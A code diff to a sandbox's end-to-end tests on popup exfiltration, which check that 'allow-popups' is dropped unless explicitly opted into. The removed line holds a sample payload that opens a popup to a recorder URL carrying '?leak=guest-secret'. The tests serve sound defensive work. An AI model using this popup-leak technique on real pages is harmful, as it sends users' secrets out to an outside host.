@@ -1,5 +1,6 @@
 import { test, expect } from '../../../test/e2e/fixture';
 import { useRecorder } from '../../../test/e2e/recorder';
+import { fromPreset } from '../../../test/e2e/presets';
 
 /**
  * Research 13: popup exfiltration (backlog S12, issue #6 N3).
@@ -11,8 +12,8 @@ import { useRecorder } from '../../../test/e2e/recorder';
  */
 
 const recorder = useRecorder();
-// Firefox throws when popups are not allowed; the other engines return null
-const openPopup = (target: string) => `let r; try { r = window.open('${target}/?leak=guest-secret') ? 'opened' : 'refused'; } catch (e) { r = 'refused'; } console.log('POPUP ' + r);`;
+const preset = fromPreset('popup-exfiltration');
+const openPopup = (target: string) => preset.aimedAt(target);
 
 test('13.1 allow-popups passed as a regular capability is dropped, so no popup leaves', async ({ sandbox, context, page }) => {
     let popups = 0;
@@ -20,7 +21,8 @@ test('13.1 allow-popups passed as a regular capability is dropped, so no popup l
     const warnings: string[] = [];
     page.on('console', m => { if (m.type() === 'warning') warnings.push(m.text()); });
 
-    await sandbox.mount({ capabilities: ['allow-scripts', 'allow-popups' as any] });
+    // the preset's rules pass allow-popups as a regular capability
+    await sandbox.mount(preset.rules);
     await sandbox.run(openPopup(recorder.blocked));
 
     expect(await sandbox.waitForLog('POPUP ')).toBe('POPUP refused');
@@ -36,7 +38,7 @@ test('13.2 the explicit unsafeCapabilities opt-in still allows popups — and wa
     const warnings: string[] = [];
     page.on('console', m => { if (m.type() === 'warning') warnings.push(m.text()); });
 
-    await sandbox.mount({ unsafeCapabilities: ['allow-popups'] });
+    await sandbox.mount({ ...preset.rules, capabilities: ['allow-scripts'], unsafeCapabilities: ['allow-popups'] });
     await sandbox.run(openPopup(recorder.blocked));
 
     // Documents the accepted risk of the opt-in: the URL is the exfiltration channel.
